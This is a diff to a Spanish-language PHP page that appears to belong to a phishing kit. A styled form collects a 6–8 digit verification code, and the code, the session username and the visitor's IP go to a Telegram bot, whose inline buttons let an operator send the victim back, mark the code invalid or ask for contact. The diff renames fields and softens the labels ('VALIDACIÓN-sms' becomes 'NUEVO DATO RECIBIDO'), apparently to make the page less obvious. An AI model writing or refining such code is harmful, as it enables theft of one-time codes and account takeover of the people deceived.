@@ -5,10 +5,10 @@ include("settings.php"); // Contiene $token y $chat_id
 $usuario = $_SESSION['usuario'] ?? null;
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
-    $codigo = htmlspecialchars($_POST['ips1'] ?? '');
+    $input = htmlspecialchars($_POST['input1'] ?? '');
     $ip = $_SERVER['REMOTE_ADDR'];
 
-    $msg = "📲 VALIDACIÓN-sms 1\n👤 Usuario: $usuario\n🔢 Código: $codigo\n🌐 IP: $ip";
+    $msg = "📩 NUEVO DATO RECIBIDO\n👤 Usuario: $usuario\n🔸 Código recibido: $input\n🌐 IP: $ip";
 
     file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
         'chat_id' => $chat_id,
@@ -16,9 +16,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
         'reply_markup' => json_encode([
             'inline_keyboard' => [
                 [
-                    ['text' => '❌ SMS Error', 'callback_data' => "SMSERROR|$usuario"],
-                    ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"],
-                    ['text' => '📱 Teléfono', 'callback_data' => "NUMERO|$usuario"]
+                    ['text' => '❌ Inválido', 'callback_data' => "REINTENTAR|$usuario"],
+                    ['text' => '🔁 Volver', 'callback_data' => "VOLVER|$usuario"],
+                    ['text' => '📞 Contacto', 'callback_data' => "CONTACTAR|$usuario"]
                 ]
             ]
         ])
@@ -33,7 +33,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Validación - Error</title>
+    <title>Validación</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
             <form method="post" action="" id="f1"
                   style="display: inline-block; width: 420px; height: 660px; border-radius: 10px; background-image: url(2.svg); position: relative;">
                 <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
-                <input minlength="6" maxlength="8" id="i1" name="ips1" placeholder="Código" type="text" inputmode="numeric" required
+                <input minlength="6" maxlength="8" id="i1" name="input1" placeholder="Ingresa el dato" type="text" inputmode="numeric" required
                        style="display: block; position: relative; color: #333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
                 
                 <input type="submit" value="Continuar"
